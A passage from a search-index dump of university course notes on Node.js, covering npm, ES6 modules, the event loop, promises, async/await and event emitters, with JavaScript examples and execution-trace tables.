reject) { 9: xhr.onreadystatechange = function() { 10: if (xhr.readyState == 4) { 11: var res = xhr.responseText; 12: resolve(res); 13: } 14: }; 15: xhr.open('GET', `https://postman-echo.com/get?x=${input}`); 16: xhr.send(); 17: }); 18: 19: function feedResultToFile(result) { 20: return new Promise( function (resolve, reject) { 21: writeFile('api_result.txt', result, (err) => { 22: if (err) { 23: reject(err); 24: } else { 25: resolve('The file has been saved!'); 26: } 27: }); 28: }); 29: } 30: apiPromise 31: .then(feedResultToFile) 32: .then( (res) => console.log(res)) 33: .catch((err) => console.log(err)) ; 34:} else { 35: console.log(\"USAGE: node api_fs_callback_2nd_attempt input\"); 36:} First we wrap the API call into a promise, apiPromise , which is chained with a resolve function feedResultToFile , in which we wrap the operation of writing into the a file into another promise. When the above is executed, program counter (line num) call stack micro queue promises macro queue event reg 8 [main()] [] {promise@8} [] 9 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 15,16 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 30 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } eof [] [] {promise@8} [] {xhr.readystatechange : function@9 } When the program counter is at line 8, we instantiate a promise, which is unresolved. At line 9, we register the xhr.headystatechange event with a callback function function@9 . At lines 15-16, we are setting up the API calls and send the request, which does not affect the micro nor macro queues. At line 30, though we see a .then() chaining with promise@8, however, promise@8 is not yet resovled until function@9 is called. Hence we skip the rest. At the end of the JavaScript program, the call stack is empty and the micro task queue is also empty. Suppose at this moment, xhr 's readystatechange event is triggered, and function@9 will be added to the call stack. Suppose xhr.readyState == 4 and the responseText is hello . program counter (line num) call stack micro queue promises macro queue event reg eof [] [] {promise@8} [function@9] {xhr.readystatechange : function@9} 9 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 11,12 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 31 [] [promise@8.resolve(\"hello\") = feedResultToFile(\"hello\")] {promise@8} [] {xhr.readystatechange : function@9} We put the function@9 to call stack and execute it, which in term resolves promise@8 . Then we proceed to line 31 .then(feedResultToFile) as promise@8 is resolved, in which promise@8.resolve is enqueued to the micro task queue. When function@8 finishes, the run-time will deqeue promise@8.resolve and put feedResultToFile into the call stack to execute, which generate a promise promise@31 , which is not resolved until the fileClose event is triggered. If we follow the steps, we will get the desired behavior. program counter (line num) call stack micro queue promises macro queue event reg 19 [feedResultToFile(\"hello\")] [] {promise@8} [] {xhr.readystatechange : function@9} 20 [feedResultToFile(\"hello\")] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9, fs.fileClose: function@21} eof [] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9, fs.fileClose: function@21} In this example, we see how promises (micro tasks) and event callbacks (macro tasks) being executed together. In summary, A call to resolve does not immendiately trigger the actual resolve function. It searches for a resolver defined in the current scope, resolves if it is found. o.then(f) chaining is pending until the promise object o is resolved, then o.resolve=f is enqeueued into the micro task queue. When the call stack is empty, the run-time tries to look into the micro task queue before checking hte macro task queue. Full of promises For ease of use, many node.js libraries provides both callback (lower level) and promise (higher level) APIs, some even provides synchronous APIs. For instance, node:fs library offers all three types of APIs. Unfortunatately, xhr2 is one of those that do not provide promise APIs. To rewrite the earlier example using promise API only, we replace xhr2 with node-fetch . import fetch from 'node-fetch'; import { promises } from 'node:fs'; var args = process.argv; if (args.length > 2) { var input = args[2]; let apiPromise = fetch(`https://postman-echo.com/get?x=${input}`); apiPromise .then((response) => response.text()) .then((text) => promises.writeFile('api_result.txt', text)) .then((res) => { console.log('The file has been saved!'); return res; }) .catch((err) => console.log(err)); } else { console.log(\"USAGE: node api_fs_call_back_3rd_attempt input\"); } Nicer syntax Let p be a promise that eventually produces result r , let (r) => e be a function takes r and produces a new promise. p.then((r)=> e) can be rewritten let r = await p e The reverse direction also works. In otherwords, we can rewrite our earlier API and file writing example as follows, import fetch from 'node-fetch'; import { promises } from 'node:fs'; var args = process.argv; if (args.length > 2) { var input = args[2]; let response = await fetch(`https://postman-echo.com/get?x=${input}`); let text = await response.text(); let res = await promises.writeFile('api_result.txt', text); console.log('The file has been saved!'); } else { console.log(\"USAGE: node index.js input\"); } which will be translated to the version with .then() . When we want to use await style programming in a function, we should declare the function as async . For instance, if we rewrite the above example, by moving the main routine in to a main function. import fetch from 'node-fetch'; import { promises } from 'node:fs'; async function main(args){ if (args.length > 2) { var input = args[2]; let response = await fetch(`https://postman-echo.com/get?x=${input}`); let text = await response.text(); let res = await promises.writeFile('api_result.txt', text); console.log('The file has been saved!'); } else { console.log(\"USAGE: node index.js input\"); } } main(process.argv); User Defined Events We can define customized events to trigger callbacks in Node.js. For instance import EventEmitter from 'events'; const myEvtEmt = new EventEmitter(); myEvtEmt.on('start', (data) => { console.log(`data ${data} received`); }) myEvtEmt.emit('start', 1); we make use of the EventEmitter class imported from the events library. In the above code, we define an EventEmitter object myEvtEmt . Then we use .on() method to register a customized event start with a callback function, in this case the call back is an anonymous function taking the data and printing it out. In the third statement, we trigger the event by calling .emit() method. In case the callback does not take any parameters, the .emit() will only be called with one argument, i.e. the event. myEvtEmt.on('end', () => { console.log(`bye`); }) myEvtEmt.emit('end'); When will the event loop stop? For Node.js, some of the events are expecting a closure, e.g. API call, file operation, the Node.js event loop will keep looping until all expected closures have returned and there is no more pending tasks in the micro nor the macro queues. For browsers, the event loop will continue as it waits for the user's next input. Further Readings An interactive example showing how promise and callback works. https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/ Synchronous vs Asynchronous JavaScript \u2013 Call Stack, Promises, and More https://www.freecodecamp.org/news/synchronous-vs-asynchronous-in-javascript/#:~:text=JavaScript%20is%20a%20single%2Dthreaded,language%20with%20lots%20of%20flexibility. Node.js Event loop behavior https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick Node.js API for timer functions, setTimeout , setImmediate , setInterval . https://nodejs.org/en/docs/guides/timers-in-node Corhort Exercise (Graded) Using the callstack-microtask-macrotask table, illustrate the execution of the following JavaScript program import EventEmitter from 'events'; const ev1 = new EventEmitter(); const ev2 = new EventEmitter(); let count = 0; let promise1 = new Promise( (resolve, reject) => { resolve(count); }) let promise2 = new Promise( (resolve, reject) => { resolve(count); }) function foo(x) { return new Promise((resolve, reject) => { if (x > 10) { resolve(); } else if (x % 2 == 0) { ev1.emit('run', ++x); } else { ev2.emit('run', ++x); } }) } ev1.on('run', (data) => { console.log(`data ${data} received by ev1`); promise2.then(foo(data)); }) ev2.on('run', (data) => { console.log(`data ${data} received by ev2`); promise1.then(foo(data)); }) ev2.emit('run', count);","title":"50.003 - Node.js"},{"location":"notes/l4_2_nodejs/#50003-nodejs","text":"","title":"50.003 - Node.js"},{"location":"notes/l4_2_nodejs/#learning-outcomes","text":"By the end of this unit, you should be able to Name the differences between frontend and backend development for web application Describe the use of a package/project manager for node.js Describe the run-time system of node.js Compare the difference between event callbacks and promises. Analyse the run-time behavior of an asynchronous node.js program","title":"Learning Outcomes"},{"location":"notes/l4_2_nodejs/#frontend-vs-backend","text":"In many web applications, it is insufficient to run the application in the browser which is a run-time system hosted in the user's device, such as desktop, laptop or mobile phone. An obvious reason is that certain computation must not be executed on the user's device due to security and integrity, for instance, transferring balance from one account to another. These highly sensitive operations should be executed at the server ends, which is known as the \"backend\".","title":"Frontend vs Backend"},{"location":"notes/l4_2_nodejs/#nodejs","text":"There are many options of implementing the backend applications, e.g. Spring with Java, Django with Python, Flask with Python, Node.js with JavaScript. Node.js is a run-time system to run JavaScript applications without the browser (and its event APIs), for instance document is no longer a predefined reference in Node.js.","title":"Node.js"},{"location":"notes/l4_2_nodejs/#hello-world","text":"The hello world program in Node.js is not too far apart from the one in the browser. Suppose we have a JavaScript file name hello.js with the following content, console.log(\"hello\"); To execute it, we need the node.js run-time to be installed, for installation, please refer to https://nodejs.org/en/download Then in the terminal, node hello.js We see the message hello , being printed in the terminal. Since it is using the same language as the browser run-time, we will skip those common language features and focus on the difference.","title":"Hello World"},{"location":"notes/l4_2_nodejs/#nodejs-projectpackage-manager","text":"In most of the cases, we develop projects based on existing libraries, modules and packages. To better manage all these dependencies, we need a project management tool. npm is the mostly commonly used too in the node.js community. Its role is similar to pip for python and gradle for java. To start a Node.js project, mkdir myproj cd myproj npm init To add a dependency, we type npm i xhr2 where xhr2 is the library that we would like to install as a dependency for our current project. After executing the above command, we observe that the xhr library is downloaded to a temporary forder node_modules and the following \"dependencies\": { \"xhr2\": \"^0.2.1\" } is added to the project definition file package.json . When we clone the project to a new machine, (for development installation or deployment purpose), we can download all the dependencies defined by package.json by running npm i Next we would like to enable the ES6 module mode in this project. We will explain what is ES6 module mode shortly. Use an editor to add the following entry to the package.json file. { \"name\": \"myproj\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\" }, \"type\": \"module\", // enable module type \"author\": \"\", \"license\": \"ISC\", \"dependencies\": { \"xhr2\": \"^0.2.1\" } }","title":"Node.js Project/Package Manager"},{"location":"notes/l4_2_nodejs/#commonjs-vs-es6-modules","text":"Module system allows one to put common codes in a module which can be reused by many different use sites. For instance, consider the following JavaScript program mymath.js const pi = 3.14159 const e = 2.71828 module.exports = {pi, e}; in which we define two constant variables pi and e , and export them, so that when mymath.js is being imported in another JavaScript program, these two constant variables can be reused. Traditionally, In Common JavaScript (dubbed as CJS), we import predefined references from another JS file, via the require() function. const mymath = require('./mymath.js'); console.log(mymath.pi); In ES6 onwards, the following \"better\" syntax was instroduced, Exporting const pi = 3.14159 const e = 2.71828 export {pi, e}; Importing import {pi} from './mymath.js'; console.log(pi); For the rest of this unit, we will stick to the ES6 import syntax. Let's consider the following JavaScript program circle.js that makes use of mymath.js . import {pi} from \"./mymath.js\" class Circle { constructor(r) { this.r = r; } area() { return this.r**2 * pi; } } export default Circle; In the above, we make use of the pi defined in mymath.js to compute the area of a Circle object. And the end of the file, we export the class definition Circle with a default modifier. Note that there can only one name to be exported if default is used. Being a default export, we do not need to surround it with {} when importing. In CommonJS (pre ES6), we write modules.export = Circle instead. Consider the following program moduletest.js import Circle from './circle.js'; var circle = new Circle(10); console.log(circle.area());","title":"CommonJS vs ES6 modules"},{"location":"notes/l4_2_nodejs/#nodejs-event-loop","text":"Like JavaScript run-time in the browser, when the main program ended, Node.js run-time goes into an event loop. The Node.js event-loop consists of the following steps, (AKA phases.) \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500>\u2502 timers \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 pending callbacks \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 idle, prepare \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 incoming: \u2502 \u2502 \u2502 poll \u2502<\u2500\u2500\u2500\u2500\u2500\u2524 connections, \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 data, etc. \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u2502 check \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2514\u2500\u2500\u2524 close callbacks \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 timers: this phase executes callbacks scheduled by setTimeout() and setInterval(). pending callbacks: executes I/O callbacks deferred to the next loop iteration. idle, prepare: only used internally. poll: retrieve new I/O events; execute I/O related callbacks (almost all with the exception of close callbacks, the ones scheduled by timers, and setImmediate()); node will block here when appropriate. check: setImmediate() callbacks are invoked here. close callbacks: some close callbacks, e.g. socket.on('close', ...). Between each run of the event loop, Node.js checks if it is waiting for any asynchronous I/O or timers and shuts down cleanly if there are not any. Now we focused on call-backs and asychronous tasks (The 2nd Phase, and 4th Phase).","title":"Node.js Event-loop"},{"location":"notes/l4_2_nodejs/#nodejs-io","text":"Since node.js applications are meant for the backend system, there is no need to handle the I/O with the browser interface, instead we find the following I/O operations Network I/O File I/O other I/Os Let's consider an example of using network I/O, import XMLHttpRequest from 'xhr2'; var xhr = new XMLHttpRequest(); var args = process.argv; if (args.length > 2) { var input = args[2]; xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; console.log(res); } }; xhr.open('GET', `https://postman-echo.com/get?x=${input}`); xhr.send(); } else { console.log(\"USAGE: node index.js input\"); } The first statement, we import the XMLHttpRequest class from the package xhr2 . (We don't need to import it when the code is executed in the browser as all browser has XMLHttpRequest class builtin in the run-time, but this is not the case for node.js). In the second statement, we instantiate an XMLHttpRequest request object. In the third line, we read the command line arguments into a variable args . The following if-else statement check whether the user supplies enough arguments. In the then branch, we extract the third argument, which will be used as the input parameters in the API call. Before calling the API, we set-up a callback in the event of the state of the request changing. As we discussed earlier, the node.js run-time has an event loop, which periodically checks for events (Phase 4). In this case, the change of state in the XMLHttpRequest object is one of the events it is checking. When the event occurs, i.e. the state of the object changes, the callback function will be placed in the callback queue. When the main call stack is empty, the callback will be put into the callstack for execution. In the callback function, we check whether the state is 4 , which stands for DONE . When the call is done, we extract the response text and print it out. After setting up the callback function, we open the request and submit it. If we execute this script, we will observe the API request's repsonse being printed on the command line. Next let's consider another example that interacts with file system via the node:fs library (which is builtin). import { writeFile } from 'node:fs'; const txt = \"hello\"; writeFile('save.txt', txt, (err) => { if (err) throw err; console.log('The file has been saved!'); }); In the second statement,we define the text data to be written to the file. In third statement we write the result to a file named save.txt , note that writeFile() takes three arguments. The last argument is a callback function, whose argument err is potentially an error. In this case, when the error is present, we propogate the error by throwing it as an excception, otherwise, we print a message.","title":"Node.js I/O"},{"location":"notes/l4_2_nodejs/#callback-pyramid","text":"Let's say now we would like to combine the two examples, first we would like to make an API call, when the call is returned successfully, we save the result of the API call into a file. import XMLHttpRequest from 'xhr2'; import { writeFile } from 'node:fs'; var xhr = new XMLHttpRequest(); var args = process.argv; if (args.length > 2) { var input = args[2]; xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; writeFile('api_result.txt', res, (err) => { if (err) throw err; console.log('The file has been saved!'); }); } }; xhr.open('GET', `https://postman-echo.com/get?x=${input}`); xhr.send(); } else { console.log(\"USAGE: node index.js input\"); } Note that we have to \"embed\" the routine of writing the result res into a file api_result.txt deep inside the callback of xhr request, the writeFile() call itself has another callback. If we have many asynchronous steps following one another, the code will become complicated and hard to read.","title":"Callback Pyramid"},{"location":"notes/l4_2_nodejs/#promise","text":"Promise is a builtin class in JavaScript, which allows us to build a sequence of asynchronous tasks without nesting call-backs. A Promise object can be instantiated passing in a function as argument. This function argument is called the executor . An executor function is a higher order function that takes two functions as arguments, commonly named as resolve and reject . resolve is applied to the result of the promise during normal execution, reject is applied when some error occurs, (cf. throw ). In the following we instantiate a Promise object that always resolves. let alwaysWork = new Promise(function(resolve, reject) { resolve(); }) Let's consider a more interesting example using Promise . function asyncCounter() { var count = 0; return new Promise( (resolve, reject) => { resolve(count); }); } function incr(count) { console.log(count); return ++count; } let counter = asyncCounter(); counter .then( incr ) .then( incr ) .then( incr ) In the above we instantiate an asychronous counter by calling the function asyncCounter() , which initializes a local variable and return a promise object that resolves with the variable, recall that resolve is the continuation (i.e. the next step of the promise). Next we invoke .then method of this counter (promise) three times. We can chain the invocation because, .then method takes a method and returns a new promise. In this case, we use the incr function as the parameter of .then . In the incr function, we print the count variable and return the result of incrementing count by 1. One may point out that incr does not return a new Promise object, how could this work? Behind the scene, node.js rewrite the incr function as function incr(count) { console.log(count); return new Promise((resolve, reject) => resolve(++count)); } When we execute the above we will see the following printed on the terminal. 0 1 2 Now let's make some changes to the example, so that the incr function will stop incrementing the counter when the limit is reached. We modify the incr function as follows, // definition of asyncCounter() remains unchanged. function incr(count) { console.log(count); return new Promise((resolve, reject) => { if (count > 1) { reject(\"limit reached\"); } else { resolve(++count); } }); } In the above, incr returns a new promise object which does not always resolve with ++count . In the event that the current count value is greater than 1, it will reject the rest of the computation, by applying reject . Now coming back to the use of the counter , we chain it with incr 4 times, followed by a call to a catch() method invocation and consumes the error raised by any of the reject function call. let counter = asyncCounter(); counter .then( incr ) .then( incr ) .then( incr ) .then( incr ) .catch( (reason) => console.log(`rejected: ${reason}.`)) calling the above, we have 0 1 2 rejected: limit reached. We now argue that we don't experience any asynchronousness here. Let's modify the example by attaching a prefix to the message printed by the incr function and creating a second counter. 1: function asyncCounter() { 2: var count = 0; 3: return new Promise( (resolve, reject) => { 4: resolve(count); 5: }); 6: } 7: 8: function incr(id) { 9: return function (count) { 10: console.log(`${id}:${count}`); 11: return new Promise((resolve, reject) => { 12: if (count > 1) { 13: reject(\"limit reached\"); 14: } else { 15: resolve(++count); 16: } 17: }); 18: }; 19:} 20: 21:let counter1 = asyncCounter(); 22: 23:counter1 24: .then( incr(\"c1\") ) 25: .then( incr(\"c1\") ) 26: .then( incr(\"c1\") ) 27: .catch( (reason) => console.log(`rejected: ${reason}.`)) 28: 29:let counter2 = asyncCounter(); 30: 31:counter2 32: .then( incr(\"c2\") ) 33: .then( incr(\"c2\") ) 34: .then( incr(\"c2\") ) 35: .catch( (reason) => console.log(`rejected: ${reason}.`)) 36: 37:process.nextTick(() => console.log(\"tick!\")); 38:console.log(\"main done!\") In the 2nd last statement, we call process.nextTick() which prints a tick! message at the next event loop cycle. When executing the above example, we observe main done! c1:0 c2:0 c1:1 c2:1 c1:2 c2:2 rejected: limit reached. rejected: limit reached. tick! It reveals that the execution of the incr method calls for both promise objects are interleaved. The tick message shows that all these happens in one single event loop cycle.","title":"Promise"},{"location":"notes/l4_2_nodejs/#nodejs-run-time-model","text":"Recall from the previous class, we studied the JavaScript run-time in the browser, which has a call stack, a heap, an event registry and a callback queue. 1. The run-time executes the JavaScript main program in the call stack until no more stack frame left, and goes into the event loop. 2. When there is an event triggered, the callback function associated with the event (in the event registery) will be added to the callback queue. 3. In an event loop cycle, when there is no more frame in the call stack but there is some item in the call back queue, the run-time will dequeue the callback from the queue and add it to the call stack. With the presence of Promise , there are more than one callback queues. For simplicity, let's say there are two. 1. The macro task queue, which is same as the callback queue that stores callback associated with events. 2. The micro task queue, which stores callbacks associated with promises. Given that promises are special builtin of Node.js run-time, they are treated \"differently\" when executed. When a promise is instantiated, its excutor function is executed upto the resolve(...) (or reject(...) ) statement. The call of resolve(...) (or reject(...) ) is enqueued into the micro task queue. In an event loop cycle, when the call stack is empty, the run-time checks whether the micro task queue contains any item before checking the macro task queue. We illustrate the execution the last example in the following table, for simplicity, we omit the event registry table, and the macro task queue since they are empty in this example. We are interested in the program counter, the call stack, the micro task queue, a list of promises. program counter (line num) call stack micro queue promises 21 [main] [] {} 1 [main, asyncCounter] [] {} 3 [main, asyncCounter] [] {promise@21} 23 [main] [] {promise@21} 8-9 [main, incr] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} 23 [main] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} In the above we show the execution of the program from line 1 to line 27. 1. Line 1 defines function aysncCounter 1. Line 8 defines function incr . 1. Line 21, asyncCounter() is invoked, the program counter moves back to line 2 then line 3, 1. Line 3, a promise object promise@21 is instantiated, its body is executed upto the call to resolve , since at this stage, we are not sure what the resolve function could be. We add promise@21 to the set of promises. We added the suffix @21 to indicate that the promise object was instantiated and with reference at line 21. This helps us to reason about the execution. 1. Line 23, promise@21 is being chained with .then(incr(\"c1\")) , we first move the program pointer back to line 8-9 and compute incr(\"c1\") , which add the function call to call stack 1. Line 9, we return a function, this function will be the resolve function of the promise@21 object. One may ask what about the reject function of the same promise object, since in this case the reject is never used, we could omit it. To be precise, we can say that it can be an identity reject function. js (err) => new Promise((resolve, reject) => reject(err)); We've done with the call incr(\"c1\") and return to the call site Line 24. It is another chain with .then . However the value to be produced here is the result of a task from the micro task queue, we skip the rest. If we continue to execute the rest of the program (ignoring lines 37-38), we will end up with program counter (line num) call stack micro queue promises 29 [main()] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21, promise@29} 1 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 3 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 8-9 [main(), incr()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} eof [] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} At this stage, the call stack is empty, the node.js run-time dequeues the first task from the micro task queue, i.e. promise@21.resolve(0) . incr(\"c1\")(0) prints c1:0 , generates a new promise promise@24 (because the promise object will be returned to the chaining at line 24). program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29, promise@24} Since the promise at line 24 become known, thanks to the .then(incr(\"c1\")) a line 25, we resolve the promise at line 24 and enqueue to the micro queue. program counter (line num) call stack micro queue promises 25 [] [ promise@29.resolve(0)=incr(\"c2\")(0), promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24} Since the call stack is empty, we dequeue the next item from micro task queue, which is program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24, promise@32} Since the promise at line 32 become known, thanks to the .then(incr(\"c2\")) , we resolve the promise at line 32 and enqueue to the micro queue. program counter (line num) call stack micro queue promises 33 [] [ promise@24.resolve(1)=incr(\"c1\")(1), promise@32.resolve(1)=incr(\"c2\")(1) ] {promise@21, promise@29, promise@24, promise@32} By repeating the similar steps, we get c1:0 c2:0 c1:1 c2:1 c1:2 c2:2 rejected: limit reached. rejected: limit reached.","title":"Node.js run-time model"},{"location":"notes/l4_2_nodejs/#mixing-callbacks-and-promises","text":"Returning to the earlier example with API call and file write operations, we now can rewrite the example as follows by introducing promises. 1: import XMLHttpRequest from 'xhr2'; 2: import { writeFile } from 'node:fs'; 3: 4: var xhr = new XMLHttpRequest(); 5: var args = process.argv; 6: if (args.length > 2) { 7: var input = args[2]; 8: let apiPromise = new Promise( function (resolve, reject) { 9: xhr.onreadystatechange = function() { 10: if (xhr.readyState == 4) { 11: var res = xhr.responseText; 12: resolve(res); 13: } 14: }; 15: xhr.open('GET', `https://postman-echo.com/get?x=${input}`); 16: xhr.send(); 17: }); 18: 19: function feedResultToFile(result) { 20: return new Promise( function (resolve, reject) { 21: writeFile('api_result.txt', result, (err) => { 22: if (err) { 23: reject(err); 24: } else { 25: resolve('The file has been saved!'); 26: } 27: }); 28: }); 29: } 30: apiPromise 31: .then(feedResultToFile) 32: .then( (res) => console.log(res)) 33: .catch((err) => console.log(err)) ; 34:} else { 35: console.log(\"USAGE: node api_fs_callback_2nd_attempt input\"); 36:} First we wrap the API call into a promise, apiPromise , which is chained with a resolve function feedResultToFile , in which we wrap the operation of writing into the a file into another promise. When the above is executed, program counter (line num) call stack micro queue promises macro queue event reg 8 [main()] [] {promise@8} [] 9 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 15,16 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 30 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } eof [] [] {promise@8} [] {xhr.readystatechange : function@9 } When the program counter is at line 8, we instantiate a promise, which is unresolved. At line 9, we register the xhr.headystatechange event with a callback function function@9 . At lines 15-16, we are setting up the API calls and send the request, which does not affect the micro nor macro queues. At line 30, though we see a .then() chaining with promise@8, however, promise@8 is not yet resovled until function@9 is called. Hence we skip the rest. At the end of the JavaScript program, the call stack is empty and the micro task queue is also empty. Suppose at this moment, xhr 's readystatechange event is triggered, and function@9 will be added to the call stack. Suppose xhr.readyState == 4 and the responseText is hello . program counter (line num) call stack micro queue promises macro queue event reg eof [] [] {promise@8} [function@9] {xhr.readystatechange : function@9} 9 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 11,12 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 31 [] [promise@8.resolve(\"hello\") = feedResultToFile(\"hello\")] {promise@8} [] {xhr.readystatechange : function@9} We put the function@9 to call stack and execute it, which in term resolves promise@8 . Then we proceed to line 31 .then(feedResultToFile) as promise@8 is resolved, in which promise@8.resolve is enqueued to the micro task queue. When function@8 finishes, the run-time will deqeue promise@8.resolve and put feedResultToFile into the call stack to execute, which generate a promise promise@31 , which is not resolved until the fileClose event is triggered. If we follow the steps, we will get the desired behavior. program counter (line num) call stack micro queue promises macro queue event reg 19 [feedResultToFile(\"hello\")] [] {promise@8} [] {xhr.readystatechange : function@9} 20 [feedResultToFile(\"hello\")] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9, fs.fileClose: function@21} eof [] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9, fs.fileClose: function@21} In this example, we see how promises (micro tasks) and event callbacks (macro tasks) being executed together. In summary, A call to resolve does not immendiately trigger the actual resolve function. It searches for a resolver defined in the current scope, resolves if it is found. o.then(f) chaining is pending until the promise object o is resolved, then o.resolve=f is enqeueued into the micro task queue. When the call stack is empty, the run-time tries to look into the micro task queue before checking hte macro task queue.","title":"Mixing callbacks and promises"},{"location":"notes/l4_2_nodejs/#full-of-promises","text":"For ease of use, many node.js libraries provides both callback (lower level) and promise (higher level) APIs, some even provides synchronous APIs. For instance, node:fs library offers all three types of APIs. Unfortunatately, xhr2 is one of those that do not provide promise APIs. To rewrite the earlier example using promise API only, we replace xhr2 with node-fetch . import fetch from 'node-fetch'; import { promises } from 'node:fs'; var args = process.argv; if (args.length > 2) { var input = args[2]; let apiPromise = fetch(`https://postman-echo.com/get?x=${input}`); apiPromise .then((response) => response.text()) .then((text) => promises.writeFile('api_result.txt', text)) .then((res) => { console.log('The file has been saved!'); return res; }) .catch((err) => console.log(err)); } else { console.log(\"USAGE: node api_fs_call_back_3rd_attempt input\"); }","title":"Full of promises"},{"location":"notes/l4_2_nodejs/#nicer-syntax","text":"Let p be a promise that eventually produces result r , let (r) => e be a function takes r and produces a new promise. p.then((r)=> e) can be rewritten let r = await p e The reverse direction also works. In otherwords, we can rewrite our earlier API and file writing example as follows, import fetch from 'node-fetch'; import { promises } from 'node:fs'; var args = process.argv; if (args.length > 2) { var input = args[2]; let response = await fetch(`https://postman-echo.com/get?x=${input}`); let text = await response.text(); let res = await promises.writeFile('api_result.txt', text); console.log('The file has been saved!'); } else { console.log(\"USAGE: node index.js input\"); } which will be translated to the version with .then() . When we want to use await style programming in a function, we should declare the function as async . For instance, if we rewrite the above example, by moving the main routine in to a main function. import fetch from 'node-fetch'; import { promises } from 'node:fs'; async function main(args){ if (args.length > 2) { var input = args[2]; let response = await fetch(`https://postman-echo.com/get?x=${input}`); let text = await response.text(); let res = await promises.writeFile('api_result.txt', text); console.log('The file has been saved!'); } else { console.log(\"USAGE: node index.js input\"); } } main(process.argv);","title":"Nicer 